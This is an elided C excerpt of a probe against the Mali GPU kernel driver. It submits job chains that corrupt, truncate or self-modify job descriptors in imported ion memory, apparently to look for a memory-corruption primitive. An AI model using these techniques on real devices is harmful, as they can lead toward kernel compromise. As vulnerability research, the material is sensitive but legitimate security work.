...
static void build_zero_desc_with_next(uint32_t *jc_cpu, uint64_t target_gpu_va,
                                      uint64_t next_gpu_va)
{
    build_zero_desc(jc_cpu, target_gpu_va);
    jc_cpu[6] = (uint32_t)next_gpu_va;
    jc_cpu[7] = (uint32_t)(next_gpu_va >> 32);
}
...
static void run_probe(void)
{
    ...
    uint64_t scratch_gpu_va = 0, mid_gpu_va = 0;
    uint32_t *jc_cpu = MAP_FAILED;
    uint64_t *dest_cpu = MAP_FAILED, *scratch_cpu = MAP_FAILED, *mid_cpu = MAP_FAILED;
    ...
    scratch_gpu_va = mali_alloc_page(mali_fd);
    mid_gpu_va = mali_alloc_page(mali_fd);
    ...
    scratch_cpu = (uint64_t *)mali_cpu_map(mali_fd, scratch_gpu_va);
    mid_cpu = (uint64_t *)mali_cpu_map(mali_fd, mid_gpu_va);
    printf("native=0x%llx import=0x%llx jc=0x%llx scratch=0x%llx mid=0x%llx dest=0x%llx jc_cpu=%p dest_cpu=%p\n",
           (unsigned long long)native_gpu_va, (unsigned long long)import_gpu_va,
           (unsigned long long)jc_gpu_va, (unsigned long long)scratch_gpu_va,
           (unsigned long long)mid_gpu_va, (unsigned long long)dest_gpu_va, jc_cpu, dest_cpu);
    if (!native_gpu_va || !jc_gpu_va || !dest_gpu_va || !scratch_gpu_va || !mid_gpu_va ||
        !import_gpu_va || jc_cpu == MAP_FAILED || dest_cpu == MAP_FAILED ||
        scratch_cpu == MAP_FAILED || mid_cpu == MAP_FAILED)
        goto out;
    ...
    build_zero_desc((uint32_t *)ion_map, dest_gpu_va);
    memset(dest_cpu, 0xAA, 4096);
    fill_atom(&atom, import_gpu_va, BASE_JD_REQ_CS, 20, 0, 0);
    submit_atom(mali_fd, &atom, &ev, "direct import jc");
    printf("direct import jc dest=0x%016llx\n", (unsigned long long)dest_cpu[0]);
    ...
    build_zero_desc((uint32_t *)ion_map, dest_gpu_va);
    memset(dest_cpu, 0xAA, 4096);
    fill_atom(&atom, import_gpu_va, BASE_JD_REQ_CS | BASE_JD_REQ_EXTERNAL_RESOURCES,
              21, (uint64_t)(uintptr_t)import_res_shared, 1);
    submit_atom(mali_fd, &atom, &ev, "hw extres import shared jc-import");
    printf("hw extres import shared jc-import dest=0x%016llx\n", (unsigned long long)dest_cpu[0]);
    build_zero_desc(jc_cpu, dest_gpu_va);
    ...
    memset(dest_cpu, 0xAA, 4096);
    fill_atom(&atom, import_gpu_va, BASE_JD_REQ_CS | BASE_JD_REQ_EXTERNAL_RESOURCES,
              22, (uint64_t)(uintptr_t)import_res_excl, 1);
    submit_atom(mali_fd, &atom, &ev, "hw extres import excl jc-import");
    printf("hw extres import excl jc-import dest=0x%016llx\n", (unsigned long long)dest_cpu[0]);
    build_zero_desc(jc_cpu, dest_gpu_va);

    build_zero_desc(jc_cpu, import_gpu_va + 0);
    build_zero_desc((uint32_t *)ion_map, dest_gpu_va);
    memset(dest_cpu, 0xAA, 4096);
    fill_atom(&chain[0], jc_gpu_va, BASE_JD_REQ_CS, 30, 0, 0);
    fill_atom(&chain[1], import_gpu_va, BASE_JD_REQ_CS | BASE_JD_REQ_EXTERNAL_RESOURCES,
              31, (uint64_t)(uintptr_t)import_res_shared, 1);
    set_dep(&chain[1].pre_dep[1], 30, BASE_JD_DEP_TYPE_DATA);
    submit_atoms(mali_fd, chain, 2, chain_evs, "corrupt imported jc +0");
    printf("corrupt imported jc +0 dest=0x%016llx\n", (unsigned long long)dest_cpu[0]);

    build_zero_desc(jc_cpu, import_gpu_va + 40);
    build_zero_desc((uint32_t *)ion_map, dest_gpu_va);
    memset(dest_cpu, 0xAA, 4096);
    fill_atom(&chain[0], jc_gpu_va, BASE_JD_REQ_CS, 32, 0, 0);
    fill_atom(&chain[1], import_gpu_va, BASE_JD_REQ_CS | BASE_JD_REQ_EXTERNAL_RESOURCES,
              33, (uint64_t)(uintptr_t)import_res_shared, 1);
    set_dep(&chain[1].pre_dep[1], 32, BASE_JD_DEP_TYPE_DATA);
    submit_atoms(mali_fd, chain, 2, chain_evs, "corrupt imported jc +40");
    printf("corrupt imported jc +40 dest=0x%016llx\n", (unsigned long long)dest_cpu[0]);

    build_zero_desc_with_next((uint32_t *)ion_map, scratch_gpu_va, import_gpu_va + 64);
    build_zero_desc_with_next((uint32_t *)ion_map + 16, mid_gpu_va, import_gpu_va + 128);
    build_zero_desc_with_next((uint32_t *)ion_map + 32, dest_gpu_va, 0);
    memset(scratch_cpu, 0xAA, 4096);
    memset(mid_cpu, 0xBB, 4096);
    memset(dest_cpu, 0xCC, 4096);
    fill_atom(&atom, import_gpu_va, BASE_JD_REQ_CS | BASE_JD_REQ_EXTERNAL_RESOURCES,
              34, (uint64_t)(uintptr_t)import_res_shared, 1);
    submit_atom(mali_fd, &atom, &ev, "imported chain control");
    printf("imported chain control scratch=0x%016llx mid=0x%016llx dest=0x%016llx\n",
           (unsigned long long)scratch_cpu[0], (unsigned long long)mid_cpu[0],
           (unsigned long long)dest_cpu[0]);

    build_zero_desc(jc_cpu, import_gpu_va + 64 + 24);
    build_zero_desc_with_next((uint32_t *)ion_map, scratch_gpu_va, import_gpu_va + 64);
    build_zero_desc_with_next((uint32_t *)ion_map + 16, mid_gpu_va, import_gpu_va + 128);
    build_zero_desc_with_next((uint32_t *)ion_map + 32, dest_gpu_va, 0);
    memset(scratch_cpu, 0xAA, 4096);
    memset(mid_cpu, 0xBB, 4096);
    memset(dest_cpu, 0xCC, 4096);
    fill_atom(&chain[0], jc_gpu_va, BASE_JD_REQ_CS, 35, 0, 0);
    fill_atom(&chain[1], import_gpu_va, BASE_JD_REQ_CS | BASE_JD_REQ_EXTERNAL_RESOURCES,
              36, (uint64_t)(uintptr_t)import_res_shared, 1);
    set_dep(&chain[1].pre_dep[1], 35, BASE_JD_DEP_TYPE_DATA);
    submit_atoms(mali_fd, chain, 2, chain_evs, "truncate imported chain desc1 next");
    printf("truncate imported chain desc1 next scratch=0x%016llx mid=0x%016llx dest=0x%016llx\n",
           (unsigned long long)scratch_cpu[0], (unsigned long long)mid_cpu[0],
           (unsigned long long)dest_cpu[0]);

    build_zero_desc(jc_cpu, import_gpu_va + 64 + 32);
    build_zero_desc_with_next((uint32_t *)ion_map, scratch_gpu_va, import_gpu_va + 64);
    build_zero_desc_with_next((uint32_t *)ion_map + 16, mid_gpu_va, import_gpu_va + 128);
    build_zero_desc_with_next((uint32_t *)ion_map + 32, dest_gpu_va, 0);
    memset(scratch_cpu, 0xAA, 4096);
    memset(mid_cpu, 0xBB, 4096);
    memset(dest_cpu, 0xCC, 4096);
    fill_atom(&chain[0], jc_gpu_va, BASE_JD_REQ_CS, 40, 0, 0);
    fill_atom(&chain[1], import_gpu_va, BASE_JD_REQ_CS | BASE_JD_REQ_EXTERNAL_RESOURCES,
              41, (uint64_t)(uintptr_t)import_res_shared, 1);
    set_dep(&chain[1].pre_dep[1], 40, BASE_JD_DEP_TYPE_DATA);
    submit_atoms(mali_fd, chain, 2, chain_evs, "cancel imported chain desc1 target");
    printf("cancel imported chain desc1 target scratch=0x%016llx mid=0x%016llx dest=0x%016llx\n",
           (unsigned long long)scratch_cpu[0], (unsigned long long)mid_cpu[0],
           (unsigned long long)dest_cpu[0]);

    build_zero_desc(jc_cpu, import_gpu_va + 128 + 32);
    build_zero_desc_with_next((uint32_t *)ion_map, scratch_gpu_va, import_gpu_va + 64);
    build_zero_desc_with_next((uint32_t *)ion_map + 16, mid_gpu_va, import_gpu_va + 128);
    build_zero_desc_with_next((uint32_t *)ion_map + 32, dest_gpu_va, 0);
    memset(scratch_cpu, 0xAA, 4096);
    memset(mid_cpu, 0xBB, 4096);
    memset(dest_cpu, 0xCC, 4096);
    fill_atom(&chain[0], jc_gpu_va, BASE_JD_REQ_CS, 42, 0, 0);
    fill_atom(&chain[1], import_gpu_va, BASE_JD_REQ_CS | BASE_JD_REQ_EXTERNAL_RESOURCES,
              43, (uint64_t)(uintptr_t)import_res_shared, 1);
    set_dep(&chain[1].pre_dep[1], 42, BASE_JD_DEP_TYPE_DATA);
    submit_atoms(mali_fd, chain, 2, chain_evs, "cancel imported chain desc2 target");
    printf("cancel imported chain desc2 target scratch=0x%016llx mid=0x%016llx dest=0x%016llx\n",
           (unsigned long long)scratch_cpu[0], (unsigned long long)mid_cpu[0],
           (unsigned long long)dest_cpu[0]);

    build_zero_desc_with_next((uint32_t *)ion_map, import_gpu_va + 64 + 24, import_gpu_va + 64);
    build_zero_desc_with_next((uint32_t *)ion_map + 16, mid_gpu_va, import_gpu_va + 128);
    build_zero_desc_with_next((uint32_t *)ion_map + 32, dest_gpu_va, 0);
    memset(scratch_cpu, 0xAA, 4096);
    memset(mid_cpu, 0xBB, 4096);
    memset(dest_cpu, 0xCC, 4096);
    fill_atom(&atom, import_gpu_va, BASE_JD_REQ_CS | BASE_JD_REQ_EXTERNAL_RESOURCES,
              37, (uint64_t)(uintptr_t)import_res_shared, 1);
    submit_atom(mali_fd, &atom, &ev, "imported self-mod desc1 next");
    msync(ion_map, 4096, MS_SYNC | MS_INVALIDATE);
    printf("imported self-mod desc1 next scratch=0x%016llx mid=0x%016llx dest=0x%016llx\n",
           (unsigned long long)scratch_cpu[0], (unsigned long long)mid_cpu[0],
           (unsigned long long)dest_cpu[0]);
    printf("imported self-mod desc1 next qword=0x%016llx\n",
           (unsigned long long)((uint64_t *)ion_map)[11]);

    build_zero_desc_with_next((uint32_t *)ion_map, import_gpu_va + 64 + 40, import_gpu_va + 64);
    build_zero_desc_with_next((uint32_t *)ion_map + 16, mid_gpu_va, import_gpu_va + 128);
    build_zero_desc_with_next((uint32_t *)ion_map + 32, dest_gpu_va, 0);
    memset(scratch_cpu, 0xAA, 4096);
    memset(mid_cpu, 0xBB, 4096);
    memset(dest_cpu, 0xCC, 4096);
    fill_atom(&atom, import_gpu_va, BASE_JD_REQ_CS | BASE_JD_REQ_EXTERNAL_RESOURCES,
              38, (uint64_t)(uintptr_t)import_res_shared, 1);
    submit_atom(mali_fd, &atom, &ev, "imported self-mod desc1 type");
    msync(ion_map, 4096, MS_SYNC | MS_INVALIDATE);
    printf("imported self-mod desc1 type scratch=0x%016llx mid=0x%016llx dest=0x%016llx\n",
           (unsigned long long)scratch_cpu[0], (unsigned long long)mid_cpu[0],
           (unsigned long long)dest_cpu[0]);
    printf("imported self-mod desc1 type qword=0x%016llx\n",
           (unsigned long long)((uint64_t *)ion_map)[13]);

    build_zero_desc_with_next((uint32_t *)ion_map, mid_gpu_va, import_gpu_va + 64);
    build_zero_desc_with_next((uint32_t *)ion_map + 16, import_gpu_va + 128 + 40, import_gpu_va + 128);
    build_zero_desc_with_next((uint32_t *)ion_map + 32, dest_gpu_va, 0);
    memset(scratch_cpu, 0xAA, 4096);
    memset(mid_cpu, 0xBB, 4096);
    memset(dest_cpu, 0xCC, 4096);
    fill_atom(&atom, import_gpu_va, BASE_JD_REQ_CS | BASE_JD_REQ_EXTERNAL_RESOURCES,
              39, (uint64_t)(uintptr_t)import_res_shared, 1);
    submit_atom(mali_fd, &atom, &ev, "imported self-mod desc2 type");
    msync(ion_map, 4096, MS_SYNC | MS_INVALIDATE);
    printf("imported self-mod desc2 type scratch=0x%016llx mid=0x%016llx dest=0x%016llx\n",
           (unsigned long long)scratch_cpu[0], (unsigned long long)mid_cpu[0],
           (unsigned long long)dest_cpu[0]);
    printf("imported self-mod desc2 type qword=0x%016llx\n",
           (unsigned long long)((uint64_t *)ion_map)[21]);
...
out:
    ...
    if (jc_cpu != MAP_FAILED)
        munmap(jc_cpu, 4096);
    mali_free_checked(mali_fd, mid_gpu_va);
    mali_free_checked(mali_fd, scratch_gpu_va);
